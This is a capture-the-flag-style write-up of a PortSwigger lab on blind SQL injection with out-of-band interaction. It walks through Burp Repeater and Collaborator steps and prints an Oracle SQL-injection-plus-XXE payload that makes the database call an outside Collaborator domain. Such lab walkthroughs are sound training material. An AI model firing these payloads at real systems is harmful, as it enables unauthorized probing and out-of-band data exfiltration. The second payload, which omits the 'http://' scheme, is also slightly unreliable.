## Lab Description :

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/0c8f9c66-4a4e-4986-809c-7f98925ddf02)

## Solution :

The payloads for each domain to perform a DNS lookup to an external domain.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/568c42f2-93d8-4a55-8fa9-ad774eeef678)

Query made - 

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '<COOKIE-VALUE>'
```

Request captured -

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/d9470386-e993-4095-9db8-67786c0f9813)


`Send this to Repeater`

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/ca5c93bf-8835-4671-8739-0371b4d10b02)


`Then Open the burp collaborator client, copy one of the domain provided` 

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/50679058-e287-42be-ae95-afafa4239c9f)

Then click on copy to clipbord option = `dxelsktl4a73xfpmfkhbfxj6fxlo9ex3.oastify.com` we need paste it in the payload which we are going to do.

Since we are unsure of the database we are working with, we attempt every payload listed on DNS lookup for every database.

So the first one will be  `Oracle`

For that the payload is 

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>'' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual)--
```

Then query will be changed by pasting the external  domain provided by collaborator would look like this

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' ' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "dxelsktl4a73xfpmfkhbfxj6fxlo9ex3.oastify.com/"> %remote;]>'),'/l') FROM dual)--
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/c71e3347-c20a-4269-8930-999d6ca7b6d9)

Then ctrl+u to encode the payload.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/395341c4-9d93-4f1f-8cba-c682b68f4261)







